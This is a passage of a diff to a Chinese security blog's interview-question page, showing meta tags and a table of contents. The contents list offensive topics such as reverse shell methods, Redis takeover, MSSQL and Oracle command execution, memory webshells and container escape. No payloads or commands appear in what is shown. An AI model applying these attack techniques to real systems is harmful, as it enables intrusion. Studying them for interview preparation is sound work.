@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="https:&#x2F;&#x2F;github.com&#x2F;vvmdx&#x2F;Sec-Interview-4-2023 MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？在 MSSQL 中，除了使用 xp_cmdshell 和 sp_oacreate，还可以通过以下方法执行系统命令：  CLR 集成：  启用 CLR 集成，创建 CLR 存储过程来执行命令。 步骤包括启用 CLR、创建程">
+    <meta name="description" content="https:&#x2F;&#x2F;github.com&#x2F;vvmdx&#x2F;Sec-Interview-4-2023 OWASP TOP 10A1 注入漏洞A2 失效的身份认证A3 敏感数据泄露A4 XML 外部实体漏洞A5 无效的访问控制A6 安全配置错误A8 不安全的反序列化漏洞A9 使用含有已知漏洞的组件A10 日志记录和监控不足导致的风险 MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办">
 <meta property="og:type" content="article">
 <meta property="og:title" content="【工作】面试题整理 大厂常见问题">
 <meta property="og:url" content="https://godreams.cn/2024/03/17/work/workpre4/index.html">
 <meta property="og:site_name" content="g0dam">
-<meta property="og:description" content="https:&#x2F;&#x2F;github.com&#x2F;vvmdx&#x2F;Sec-Interview-4-2023 MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？在 MSSQL 中，除了使用 xp_cmdshell 和 sp_oacreate，还可以通过以下方法执行系统命令：  CLR 集成：  启用 CLR 集成，创建 CLR 存储过程来执行命令。 步骤包括启用 CLR、创建程">
+<meta property="og:description" content="https:&#x2F;&#x2F;github.com&#x2F;vvmdx&#x2F;Sec-Interview-4-2023 OWASP TOP 10A1 注入漏洞A2 失效的身份认证A3 敏感数据泄露A4 XML 外部实体漏洞A5 无效的访问控制A6 安全配置错误A8 不安全的反序列化漏洞A9 使用含有已知漏洞的组件A10 日志记录和监控不足导致的风险 MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-03-17T08:43:01.000Z">
-<meta property="article:modified_time" content="2025-03-18T02:54:52.636Z">
+<meta property="article:modified_time" content="2025-03-25T13:15:49.368Z">
 <meta property="article:author" content="g0dam">
 <meta property="article:tag" content="null">
 <meta name="twitter:card" content="summary">
@@ -90,7 +90,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2024/09/10/PaperReading/Auto-Login/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2024/03/25/work/workproject/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2024/03/17/work/workandroid/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -123,7 +123,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E9%99%A4%E4%BA%86-xp-cmdshell%E3%80%81sp-oacreate-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR-%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">CLR 原理以及流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E8%83%BD%E4%B8%8D%E8%83%BD-RCE%EF%BC%9F%E6%80%8E%E4%B9%88-RCE%EF%BC%9F%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6%E6%98%AF%E5%95%A5%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">Oracle 能不能 RCE？怎么 RCE？前置条件是啥？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Autotype-false-%E7%BB%95%E8%BF%87%E6%9C%89%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">Autotype&#x3D;false 绕过有几种思路？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPInfo-%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">5.</span> <span class="toc-text">PHPInfo 你会关注哪些信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E6%9E%90%E9%A1%BA%E5%BA%8F%E5%92%8C%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F"><span class="toc-number">6.</span> <span class="toc-text">浏览器解析顺序和解码顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4limit%E5%90%8E%E7%9A%84%E9%80%97%E5%8F%B7%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">7.</span> <span class="toc-text">过滤limit后的逗号如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">8.</span> <span class="toc-text">过滤逗号的SQL注入如何绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%EF%BC%88SSTI%E5%8E%9F%E7%90%86%EF%BC%8C%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%8Cpayload%E7%9B%B8%E5%85%B3%E7%9A%84%E4%B8%9C%E8%A5%BF%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">Python相关的漏洞（SSTI原理，利用过程，payload相关的东西）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">10.</span> <span class="toc-text">Java 内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E3%80%81%E5%93%A5%E6%96%AF%E6%8B%89%E5%B7%A5%E5%85%B7"><span class="toc-number">11.</span> <span class="toc-text">冰蝎、哥斯拉工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%A1%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BC%95%E6%93%8E%E7%9A%84%E6%AD%A5%E9%AA%A4%E5%92%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">12.</span> <span class="toc-text">审表达式引擎的步骤和思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%88%86%E6%9E%90"><span class="toc-number">13.</span> <span class="toc-text">XXE漏洞成因及代码层面分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%81%87%E5%88%B0ORDER-BY%E6%97%B6%E7%9A%84%E9%98%B2%E5%BE%A1"><span class="toc-number">14.</span> <span class="toc-text">遇到ORDER BY时的防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">15.</span> <span class="toc-text">宽字节注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E8%BD%AC%E4%B9%89%E6%97%B6%E7%9A%84%E5%A4%84%E7%90%86"><span class="toc-number">16.</span> <span class="toc-text">特殊字符转义时的处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%9C%A8Docker%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8"><span class="toc-number">17.</span> <span class="toc-text">基于黑白名单的修复在Docker环境中的应用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">18.</span> <span class="toc-text">Java系统代码审计流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%B3%BB%E7%BB%9F%E4%B8%ADSQL%E6%B3%A8%E5%85%A5%E7%9A%84%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D"><span class="toc-number">19.</span> <span class="toc-text">Java系统中SQL注入的防御与修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">19.1.</span> <span class="toc-text">防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">19.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%97%B6%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%85%A5%E6%89%8B%E7%82%B9"><span class="toc-number">20.</span> <span class="toc-text">反序列化时的魔术方法入手点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8PHP%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8SSRF"><span class="toc-number">21.</span> <span class="toc-text">在PHP环境下利用SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E4%BB%A3%E7%A0%81%E5%B8%B8%E8%A7%81%E5%85%A5%E5%8F%A3%E5%87%BD%E6%95%B0%E7%9A%84%E6%9F%A5%E6%89%BE"><span class="toc-number">22.</span> <span class="toc-text">PHP代码常见入口函数的查找</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%BC%80%E5%8F%91%E6%A1%86%E6%9E%B6%E7%9A%84URL%E8%B7%AF%E7%94%B1%E6%96%B9%E6%B3%95"><span class="toc-number">23.</span> <span class="toc-text">PHP开发框架的URL路由方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%B6%89%E5%8F%8A%E7%9A%84PHP%E8%AE%BE%E7%BD%AE"><span class="toc-number">24.</span> <span class="toc-text">远程文件包含和本地文件包含涉及的PHP设置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84PHP%E9%85%8D%E7%BD%AE%E9%99%90%E5%88%B6"><span class="toc-number">25.</span> <span class="toc-text">本地文件包含的PHP配置限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%9C%A8%E5%81%9ASQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1%E6%97%B6%E7%9A%84%E6%96%B9%E6%B3%95"><span class="toc-number">26.</span> <span class="toc-text">PHP在做SQL注入防御时的方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-number">27.</span> <span class="toc-text">Redis解决了什么问题？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%AD%E7%82%B9%E6%95%B0%E6%8D%AE%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81Redis%E5%92%8CDB%E4%B8%AD%E7%9A%84%E4%B8%80%E8%87%B4%EF%BC%9F"><span class="toc-number">28.</span> <span class="toc-text">热点数据怎么保证Redis和DB中的一致？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E8%AE%A4%E8%AF%81%E6%98%AF%E6%80%8E%E4%B9%88%E5%81%9A%E7%9A%84%EF%BC%9F"><span class="toc-number">29.</span> <span class="toc-text">用户登录认证是怎么做的？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%8E%E4%B9%88%E4%BF%9D%E6%8A%A4%EF%BC%9F"><span class="toc-number">30.</span> <span class="toc-text">Token的安全怎么保护？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E7%9A%84%E5%86%85%E5%AE%B9%E8%AF%A5%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%EF%BC%9F"><span class="toc-number">31.</span> <span class="toc-text">Token的内容该如何设计？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E6%95%B0%E6%8D%AE%E4%B8%8D%E8%A2%AB%E7%AF%A1%E6%94%B9%E5%91%A2%EF%BC%9F"><span class="toc-number">32.</span> <span class="toc-text">怎么保证数据不被篡改呢？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8CCSRF%E9%98%B2%E5%BE%A1%EF%BC%9F"><span class="toc-number">33.</span> <span class="toc-text">如何进行CSRF防御？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%A1%E9%AA%8C%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">34.</span> <span class="toc-text">校验什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Token%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">35.</span> <span class="toc-text">Token为什么需要加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E6%B2%A1%E6%9C%89%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E5%86%99%E8%BF%87%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7"><span class="toc-number">36.</span> <span class="toc-text">有没有自己动手写过一些工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%8E%A2%E6%B5%8B%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%8F%82%E6%95%B0%E6%98%AF%E4%BB%80%E4%B9%88-%E2%80%94-%E5%A4%A7%E5%86%99%E8%BF%98%E6%98%AF%E5%B0%8F%E5%86%99"><span class="toc-number">37.</span> <span class="toc-text">nmap探测系统的参数是什么 —&gt;大写还是小写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E7%9A%84%E5%B0%8F%E5%86%99o%E4%B8%8Ea%E6%98%AF%E5%B9%B2%E5%98%9B%E7%9A%84"><span class="toc-number">38.</span> <span class="toc-text">nmap的小写o与a是干嘛的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%B2%E7%BC%96%E7%A0%81%E5%A6%82%E4%BD%95%E7%A1%AE%E8%AE%A4%E6%98%AFbase64"><span class="toc-number">39.</span> <span class="toc-text">一串编码如何确认是base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%8F%E5%AF%86%E7%A0%81%E7%9A%84%E5%8E%9F%E7%90%86%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">40.</span> <span class="toc-text">栅栏密码的原理是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E4%B8%8Emd5%E5%A6%82%E4%BD%95%E5%8C%BA%E5%88%AB"><span class="toc-number">41.</span> <span class="toc-text">base64与md5如何区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#oracle%E7%9A%84%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="toc-number">42.</span> <span class="toc-text">oracle的默认端口是多少</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E7%9A%84%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E4%B8%80%E8%88%AC%E6%94%BE%E5%88%B0%E5%93%AA"><span class="toc-number">43.</span> <span class="toc-text">mysql的管理员密码一般放到哪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E6%9E%9Csubstr-%E5%87%BD%E6%95%B0%E8%A2%AB%E7%A6%81%E7%94%A8%EF%BC%8C%E4%BD%A0%E8%84%91%E5%AD%90%E9%87%8C%E6%9C%89%E5%A4%9A%E5%B0%91%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0"><span class="toc-number">44.</span> <span class="toc-text">如果substr()函数被禁用，你脑子里有多少替换函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E5%A6%82%E4%BD%95%E6%8B%BF%E4%B8%8B%EF%BC%8C%E5%93%AA%E4%B8%AA%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%85%B7%E4%BD%93%E8%AF%AD%E5%8F%A5%EF%BC%8C%E5%85%B7%E4%BD%93%E6%93%8D%E4%BD%9C"><span class="toc-number">45.</span> <span class="toc-text">redis如何拿下，哪个端口，具体语句，具体操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E9%82%AE%E7%AE%B1%E7%9F%A5%E9%81%93%E5%AF%B9%E6%96%B9%E7%9A%84IP"><span class="toc-number">46.</span> <span class="toc-text">如何通过邮箱知道对方的IP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struct2%E6%BC%8F%E6%B4%9E"><span class="toc-number">47.</span> <span class="toc-text">Struct2漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%88%B6%E5%AD%90%E8%BF%9B%E7%A8%8B%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">48.</span> <span class="toc-text">父子进程的介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%83%B5%E5%B0%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">49.</span> <span class="toc-text">孤儿进程和僵尸进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">50.</span> <span class="toc-text">反弹shell的几种方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E5%BC%80%E6%9C%BA%E8%87%AA%E5%90%AF%E5%8A%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">51.</span> <span class="toc-text">Linux开机自启动方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#init-d%E8%84%9A%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="toc-number">52.</span> <span class="toc-text">init.d脚本介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%BA%9B%E6%96%87%E4%BB%B6"><span class="toc-number">53.</span> <span class="toc-text">Linux怎么查看程序调用了哪些文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9B%91%E6%8E%A7Linux%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">54.</span> <span class="toc-text">如何监控Linux文件操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E6%9C%89%E5%93%AA%E4%BA%9B%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="toc-number">55.</span> <span class="toc-text">Linux有哪些系统调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%BC%80%E6%94%BE%E7%9A%84%E7%BD%91%E7%BB%9C%E7%AB%AF%E5%8F%A3"><span class="toc-number">56.</span> <span class="toc-text">查看Linux开放的网络端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%8A%B6%E6%80%81"><span class="toc-number">57.</span> <span class="toc-text">查看Linux多线程状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%B8%8B%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">58.</span> <span class="toc-text">Linux下隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">59.</span> <span class="toc-text">子域名收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">60.</span> <span class="toc-text">DNS重绑定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B"><span class="toc-number">61.</span> <span class="toc-text">DNS解析的流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CC%E6%B5%81%E9%87%8F"><span class="toc-number">62.</span> <span class="toc-text">CC流量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93"><span class="toc-number">63.</span> <span class="toc-text">SSH隧道</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#runc%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">64.</span> <span class="toc-text">runc容器逃逸原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81WAF%E7%A7%8D%E7%B1%BB"><span class="toc-number">65.</span> <span class="toc-text">常见WAF种类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84UAF"><span class="toc-number">66.</span> <span class="toc-text">MySQL的UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86"><span class="toc-number">67.</span> <span class="toc-text">Java 内存马原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%9F%A5%E6%9D%80Java%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">68.</span> <span class="toc-text">如何查杀Java内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E%E5%8E%9F%E7%90%86"><span class="toc-number">69.</span> <span class="toc-text">冰蝎原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89%E5%8E%9F%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">哥斯拉原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%A2%E9%BB%91%E6%A0%91%E5%8E%9F%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">红黑树原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84HashMap%E7%94%A8%E5%88%B0%E7%BA%A2%E9%BB%91%E6%A0%91"><span class="toc-number">72.</span> <span class="toc-text">Java的HashMap用到红黑树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E7%9A%84%E7%B4%A2%E5%BC%95%E4%B8%8E%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84"><span class="toc-number">73.</span> <span class="toc-text">MySQL的索引与存储结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MySQL%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8B-%E6%A0%91"><span class="toc-number">74.</span> <span class="toc-text">MySQL为什么要用B+树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.</span> <span class="toc-text">Python沙箱逃逸的原理与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">75.1.</span> <span class="toc-text">沙箱逃逸的原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.2.</span> <span class="toc-text">沙箱逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7%E9%80%83%E9%80%B8%E7%A4%BA%E4%BE%8B"><span class="toc-number">75.3.</span> <span class="toc-text">栈帧逃逸示例</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E7%9A%84%E9%98%B2%E8%8C%83"><span class="toc-number">75.4.</span> <span class="toc-text">逃逸的防范</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E6%A6%82%E5%BF%B5%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">76.</span> <span class="toc-text">RASP的概念和原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RASP%E7%9A%84%E5%AF%B9%E6%8A%97"><span class="toc-number">77.</span> <span class="toc-text">RASP的对抗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP%E5%92%8CGolang%E8%AF%AD%E8%A8%80%E6%9C%AC%E8%BA%AB%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.</span> <span class="toc-text">PHP和Golang语言本身的安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.1.</span> <span class="toc-text">PHP的安全问题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Golang%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">78.2.</span> <span class="toc-text">Golang的安全问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-number">79.</span> <span class="toc-text">Flask 模板注入</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#OWASP-TOP-10"><span class="toc-number">1.</span> <span class="toc-text">OWASP TOP 10</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSSQL-%E9%99%A4%E4%BA%86-xp-cmdshell%E3%80%81sp-oacreate-%E8%BF%98%E6%9C%89%E4%BB%80%E4%B9%88%E5%8A%9E%E6%B3%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">MSSQL 除了 xp_cmdshell、sp_oacreate 还有什么办法执行命令？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLR-%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">CLR 原理以及流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Oracle-%E8%83%BD%E4%B8%8D%E8%83%BD-RCE%EF%BC%9F%E6%80%8E%E4%B9%88-RCE%EF%BC%9F%E5%89%8D%E7%BD%AE%E6%9D%A1%E4%BB%B6%E6%98%AF%E5%95%A5%EF%BC%9F"><span class="toc-number">4.</span> <span class="toc-text">Oracle 能不能 RCE？怎么 RCE？前置条件是啥？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Autotype-false-%E7%BB%95%E8%BF%87%E6%9C%89%E5%87%A0%E7%A7%8D%E6%80%9D%E8%B7%AF%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">Autotype&#x3D;false 绕过有几种思路？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPInfo-%E4%BD%A0%E4%BC%9A%E5%85%B3%E6%B3%A8%E5%93%AA%E4%BA%9B%E4%BF%A1%E6%81%AF"><span class="toc-number">6.</span> <span class="toc-text">PHPInfo 你会关注哪些信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 